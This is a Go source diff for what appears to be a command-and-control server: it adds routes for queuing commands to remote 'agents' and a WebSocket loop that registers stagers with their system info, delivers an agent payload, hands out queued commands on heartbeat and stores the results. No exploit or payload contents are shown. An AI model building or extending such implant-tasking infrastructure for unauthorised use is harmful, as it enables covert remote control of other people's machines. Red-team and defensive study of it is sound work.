@@ -122,6 +122,18 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 	agentRoute.GET("/clear", init.AgentCtrl.ClearAgents)
 
 	/*
+	* COMMAND routes
+	*
+	 */
+	commandRoutes := router.Group("/commands")
+	{
+		commandRoutes.POST("/agent/:agentID", init.CommandCtrl.QueueCommand)
+		commandRoutes.GET("/agent/:agentID/pending", init.CommandCtrl.GetPendingCommands)
+		commandRoutes.GET("/agent/:agentID/history", init.CommandCtrl.GetCommandHistory)
+		commandRoutes.POST("/clear", init.CommandCtrl.ClearAllCommands)
+	}
+
+	/*
 	* WEBSOCKET routes
 	*
 	* /ws GET - Websocket route
@@ -136,81 +148,210 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 		}
 		defer conn.Close()
 
+		// Handle WebSocket connection
 		for {
 			_, msg, err := conn.ReadMessage()
 			if err != nil {
-				println("Error reading message: ", err.Error())
-				return
+				println("Error reading message:", err.Error())
+				break
 			}
 
+			// Parse the message
 			var message map[string]interface{}
 			if err := json.Unmarshal(msg, &message); err != nil {
-				// Not JSON, treat as plain text
-				println("Received non-JSON message: %s", string(msg))
+				println("Error parsing message:", err.Error())
 				continue
 			}
 
-			// Check if it's a stager registration
+			// Get message type
 			messageType, ok := message["type"].(string)
-			if ok && messageType == "stager_registration" {
-				println("Agent stager connected: ", message["agentId"].(string))
+			if !ok {
+				continue
+			}
 
-				agentPayload := agent.GetAgentPayload(message["agentId"].(string))
+			println("Received message:", messageType)
 
-				var systemInfoStr string
-				if systemInfo, exists := message["systemInfo"]; exists {
-					// Convert systemInfo to JSON string for storage
-					systemInfoBytes, err := json.Marshal(systemInfo)
+			// Handle stager registration
+			if messageType == "stager_registration" {
+				// Extract agent details from registration message
+				agentID, _ := message["agentId"].(string)
+				systemInfoRaw, hasSystemInfo := message["systemInfo"].(map[string]interface{})
+
+				// Create a new agent in the database
+				agentS := &dao.Agent{
+					Name:     agentID,
+					IsStager: true, // Mark as stager initially
+					SourceIP: c.ClientIP(),
+				}
+
+				// Convert system info to JSON string for storage
+				if hasSystemInfo {
+					systemInfoBytes, err := json.Marshal(systemInfoRaw)
 					if err == nil {
-						systemInfoStr = string(systemInfoBytes)
-					} else {
-						println("Error marshaling systemInfo:", err.Error())
+						agentS.SystemInfo = string(systemInfoBytes)
 					}
-				} else {
-					println("No systemInfo found in the message")
 				}
 
-				newAgent := &dao.Agent{
-					Name:       message["agentId"].(string),
-					SourceIP:   c.ClientIP(),
-					IsStager:   true,
-					SystemInfo: systemInfoStr,
-				}
+				// Save the agent to the database
+				init.AgentCtrl.CreateAgent(agentS)
 
-				init.AgentCtrl.CreateAgent(newAgent)
+				agentPayload := agent.GetAgentPayload(agentID)
 
-				// If CreateAgent has internal error handling, no need to check for err here
-				println("Agent created successfully")
-
-				// Send back the agent payload
-				payload := map[string]interface{}{
+				// Send acknowledgment response
+				response := map[string]interface{}{
 					"type":      "agent_payload",
+					"agentId":   agentID,
 					"timestamp": time.Now().Format(time.RFC3339),
+					"message":   "Registration successful, delivering agent payload",
 					"payload":   agentPayload,
 				}
 
-				payloadJson, _ := json.Marshal(payload)
-				if err := conn.WriteMessage(websocket.TextMessage, payloadJson); err != nil {
-					println("Error sending payload: ", err.Error())
-					return
+				responseBytes, _ := json.Marshal(response)
+				conn.WriteMessage(websocket.TextMessage, responseBytes)
+
+				println("Stager registered:", agentID)
+				continue
+			}
+
+			// Handle heartbeat messages - this is where we check for pending commands
+			if messageType == "heartbeat" {
+				agentID, agentOk := message["agentId"].(string)
+				if !agentOk {
+					// Invalid heartbeat, no agent ID
+					println("Invalid heartbeat, no agent ID")
+					continue
 				}
 
-				println("Main agent payload sent to stager: ", message["agentId"].(string))
-			} else if ok && messageType == "payload_received" {
-				println("Agent confirmed payload receipt: ", message["type"].(string), message["status"].(string))
-			} else if ok && messageType == "agent_activation" {
-				// BIG NOTE HERE
-				// We are swapping agentID and Name so where agentID is mentioned treat it like name
-				println("Agent activated: ", message["agentId"].(string))
-				init.AgentCtrl.SetStager(message["agentId"].(string), false)
-			} else {
-				// Handle other message types
-				println("Received message: %v", message)
+				// Update agent's last seen timestamp
+				dbAgent, err := init.AgentCtrl.GetAgentByName(agentID)
+				if err != nil {
+					println("Error retrieving agent:", err.Error())
 
-				// Echo the message back
-				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
-					println("Error echoing message: ", err.Error())
-					return
+					// Send a simple pong response
+					response := map[string]interface{}{
+						"type":      "pong",
+						"timestamp": time.Now().Format(time.RFC3339),
+					}
+					responseBytes, _ := json.Marshal(response)
+					conn.WriteMessage(websocket.TextMessage, responseBytes)
+					continue
+				}
+
+				// IMPORTANT: Always use the original agent name for command lookup
+				commandQueryID := agentID // Always use agent name for consistency
+				println("I AM USING THIS========================", commandQueryID)
+
+				// Look for pending commands for this agent using agent name
+				command, err := init.CommandSvc.DequeueCommand(commandQueryID)
+				println("Checked for commands for agent:", agentID)
+
+				if err != nil {
+					println("Error retrieving command:", err.Error())
+
+					// Send a simple pong response
+					response := map[string]interface{}{
+						"type":      "pong",
+						"timestamp": time.Now().Format(time.RFC3339),
+					}
+					responseBytes, _ := json.Marshal(response)
+					conn.WriteMessage(websocket.TextMessage, responseBytes)
+					continue
+				}
+
+				if command != nil {
+					println("Command found for agent:", agentID, "Command:", command.Command)
+					// We have a command to send to the agent
+					response := map[string]interface{}{
+						"type":      "command",
+						"timestamp": time.Now().Format(time.RFC3339),
+						"command": map[string]interface{}{
+							"id":     command.ID,
+							"action": command.Command,
+						},
+					}
+
+					responseBytes, _ := json.Marshal(response)
+					println("Sending command to agent:", string(responseBytes))
+
+					if err := conn.WriteMessage(websocket.TextMessage, responseBytes); err != nil {
+						println("Error sending command:", err.Error())
+						// Try to put the command back in the queue
+						init.CommandSvc.QueueCommand(commandQueryID, command.Command)
+					} else {
+						println("Command sent successfully to agent:", agentID)
+					}
+				} else {
+					// No commands, send normal pong
+					println("No commands for agent:", agentID)
+					response := map[string]interface{}{
+						"type":      "pong",
+						"timestamp": time.Now().Format(time.RFC3339),
+					}
+					responseBytes, _ := json.Marshal(response)
+					conn.WriteMessage(websocket.TextMessage, responseBytes)
+				}
+			} else if messageType == "command_result" {
+				// Handle command result response
+				println("Command result received")
+
+				agentID, agentOk := message["agentId"].(string)
+				if !agentOk {
+					println("Invalid command result, no agent ID")
+					continue
+				}
+
+				commandID, commandOk := message["commandId"].(string)
+				if !commandOk {
+					println("Invalid command result, no command ID")
+					continue
+				}
+
+				result := message["result"]
+				success, _ := message["success"].(bool)
+
+				// Convert result to string for storage
+				resultStr := ""
+				if result != nil {
+					resultBytes, err := json.Marshal(result)
+					if err == nil {
+						resultStr = string(resultBytes)
+						println("Command result:", resultStr)
+					} else {
+						println("Error marshaling result:", err.Error())
+					}
+				}
+
+				// Update command status based on success
+				status := "completed"
+				if !success {
+					status = "failed"
+				}
+
+				err = init.CommandSvc.UpdateCommandStatus(agentID, commandID, status, resultStr)
+				if err != nil {
+					println("Error updating command status:", err.Error())
+				} else {
+					println("Command status updated successfully")
+				}
+
+				// Send acknowledgment
+				response := map[string]interface{}{
+					"type":      "command_ack",
+					"commandId": commandID,
+					"timestamp": time.Now().Format(time.RFC3339),
+				}
+				responseBytes, _ := json.Marshal(response)
+				conn.WriteMessage(websocket.TextMessage, responseBytes)
+			} else if messageType == "payload_received" {
+				// Handle payload acknowledgment (stager -> agent upgrade)
+				agentID, _ := message["agentId"].(string)
+				status, _ := message["status"].(string)
+
+				if status == "success" && agentID != "" {
+					// Update agent from stager to full agent
+					init.AgentCtrl.SetStager(agentID, false)
+
+					println("Agent upgraded from stager:", agentID)
 				}
 			}
 		}
